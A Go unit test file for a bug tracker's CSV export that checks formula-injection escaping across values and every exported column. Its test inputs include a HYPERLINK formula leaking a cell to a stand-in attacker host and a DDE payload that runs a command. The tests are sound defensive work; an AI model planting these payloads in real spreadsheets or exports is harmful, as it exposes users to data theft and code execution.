package service

import (
	"strings"
	"testing"
	"time"

	"github.com/omni/bugtracker/internal/domain"
)

func TestCSVSafeQuotesFormulas(t *testing.T) {
	dangerous := []string{
		`=HYPERLINK("http://attacker/"&A1,"click")`,
		`=cmd|'/c calc'!A1`,
		`+1+1`,
		`-1+1`,
		`@SUM(A1:A9)`,
		"\t=1+1",
		"\r=1+1",
		`=1+1`,
	}
	for _, v := range dangerous {
		got := csvSafe(v)
		if !strings.HasPrefix(got, "'") {
			t.Errorf("csvSafe(%q) = %q — reaches the spreadsheet as a formula", v, got)
		}
		if got != "'"+v {
			t.Errorf("csvSafe(%q) = %q — the content itself must survive intact", v, got)
		}
	}
}

// Quoting a number would turn a numeric column into text for every consumer
// downstream, and no spreadsheet reads -5 as a formula.
func TestCSVSafeLeavesNumbersAlone(t *testing.T) {
	for _, v := range []string{"", "5", "-5", "+5", "-0.5", "-5e3", "BUG-12", "hello", "a=b"} {
		if got := csvSafe(v); got != v {
			t.Errorf("csvSafe(%q) = %q, want it unchanged", v, got)
		}
	}
}

// The guard belongs to the row, not to a list of columns somebody has to remember to
// keep in sync — this is the test that fails when a new user-controlled column lands.
func TestExportRowIsSanitisedInEveryColumn(t *testing.T) {
	poison := `=cmd|'/c calc'!A1`
	sev := domain.Severity("critical")
	now := time.Now()
	i := domain.Issue{
		Key: poison, ProjectKey: poison, Title: poison, DescriptionMD: poison,
		Type: domain.IssueType(poison), Status: domain.IssueStatus(poison),
		Severity: &sev, Priority: domain.Priority(poison),
		Assignee:   &domain.User{Email: poison},
		Reporter:   &domain.User{Email: poison},
		Labels:     []string{poison},
		Components: []string{poison},
		Milestone:  poison, Release: poison,
		VersionAffected: poison, VersionFixed: poison,
		CreatedAt: now, UpdatedAt: now,
	}

	for n, cell := range csvSafeRow(exportRow(i)) {
		if strings.HasPrefix(cell, "=") || strings.HasPrefix(cell, "@") {
			t.Errorf("column %q left as a formula: %q", exportColumns[n], cell)
		}
	}
}
